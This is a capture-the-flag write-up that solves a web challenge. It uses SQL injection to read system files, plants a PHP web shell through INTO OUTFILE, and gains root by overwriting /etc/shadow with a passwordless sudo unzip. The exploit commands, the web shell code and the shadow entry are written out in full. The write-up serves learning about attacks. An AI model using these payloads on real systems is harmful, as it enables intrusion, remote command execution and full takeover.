### Solved by barrebas

NeoCTF was run during the week, which isn't optimal. This web500 challenge was fun and the rabbit hole was a bit deeper than the other challenges. Here goes!

We're presented with a form which is quite obviously vulnerable to SQL injection. The entire database could be dumped, but more importantly, the database user had FILE permission because we could this:

```bash
$ curl -vv -X POST 'http://45.55.51.22:8883/index.php' --data "search=' and 1=2 union all select load_file('/etc/passwd)' -- #"
```

This returned `/etc/passwd`. Trying INTO OUTFILE, which seemed to work, but we couldn't find the path for the webserver. The next obvious thing was to read `/etc/apache2/apache2.conf` but that didn't help us much further. However, `/etc/apache2/sites-enabled/000-default.conf` did exist:

```
$ curl -vv -X POST 'http://45.55.51.22:8883/index.php' --data "search=' and 1=2 union all select load_file('/etc/apache2/sites-enabled/000-default.conf') -- #"
* About to connect() to 45.55.51.22 port 8883 (#0)
*   Trying 45.55.51.22...
* connected
* Connected to 45.55.51.22 (45.55.51.22) port 8883 (#0)
> POST /index.php HTTP/1.1
> Host: 45.55.51.22:8883
> Accept: */*
> Content-Length: 95
> Content-Type: application/x-www-form-urlencoded
> 
* upload completely sent off: 95 out of 95 bytes
* additional stuff not fine transfer.c:1037: 0 0
* HTTP 1.1 or later with persistent connection, pipelining supported
< HTTP/1.1 200 OK
< Date: Wed, 16 Mar 2016 20:41:18 GMT
< Server: Apache/2.4.7 (Ubuntu)
< X-Powered-By: PHP/5.5.9-1ubuntu4.14
< Vary: Accept-Encoding
< Content-Length: 1488
< Content-Type: text/html
< 
<html>
<head>
<h1>Customer Database Lookup</h1>
</head>
<body>
Here you can look up the names of your customers!
<br>
<form action="index.php" method="post">
  Customer Name: <input type="text" name="search"><br>
  <input type="submit" value="Submit">
</form>
</body>
</html>
1 results. 
<VirtualHost *:80>
        ServerAdmin webmaster@localhost

        DocumentRoot /var/www/ecustomers
        <Directory />
                Options FollowSymLinks
                AllowOverride None
        </Directory>
        <Directory /var/www/vendors>
                Options Indexes FollowSymLinks MultiViews
                # To make wordpress .htaccess work
                AllowOverride FileInfo
                Order allow,deny
                allow from all
        </Directory>

        ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
        <Directory "/usr/lib/cgi-bin">
                AllowOverride None
                Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch
                Order allow,deny
                Allow from all
        </Directory>
        DirectoryIndex index.php
        ErrorLog ${APACHE_LOG_DIR}/error.log
        ErrorDocument 404 /404.php
        # Possible values include: debug, info, notice, warn, error, crit,
        # alert, emerg.
        LogLevel warn

        CustomLog ${APACHE_LOG_DIR}/access.log combined
...snip...
```

 The webserver files lived at `/var/www/ecustomers`. A simple PHP webshell was uploaded: 
 
 
```bash
$ curl -vv -X POST 'http://45.55.51.22:8883/index.php' ' --data "search=' and 1=2 union all select 0x3c3f7068702073797374656d28245f4745545b2263225d293b203f3e0a into outfile '/var/www/ecustomers/c001.php' -- #"
```

Which merely contained this PHP code:

```php
<?php system($_GET["c"]); ?>
```

Now we could browse to `http://45.55.51.22:8883/c001.php?c=ls` and have command execution. Sweet. After poking around for a while, it was apparent that the flag wasn't available to the www-data user. `/etc/sudoers` contained a big hint, because user `www-data` could run `/usr/bin/unzip` as root without a password!

A PHP reverse shell was quickly uploaded and run; the netcat listener on a VPS came alive. The python pty trick was used to obtain a slightly more functional shell. 

`ssh` was not running so unzipping an authorized_keys file wasn't going to work. The next best thing was overwriting `/etc/shadow` to gain root privileges. 

```bash
$ cd /tmp
$ echo 'root:$6$xjrLUU2F$3CdzWMlLrqbFsJ7pFiZUf/yGZgZZCetcD2ovIuPJJbFua1.XTNwxZkWqdC9uzxf/MA7Ec36m.Cs81iidSNlbw.:16876:0:99999:7:::' > shadow
$ zip shadow.zip shadow
$ sudo /usr/bin/unzip shadow.zip -d /etc
```

This overwrote the shadow file and gave the root user a password of `1234567890` (I wasn't feeling very creative). A quick `su` to root later gave us the flag in `/root/flag.txt`: 

```bash
root@29f35ba7ec05:~# cat flag.txt
cat flag.txt
flag{9th_and_ash_is_my_favorite}
```
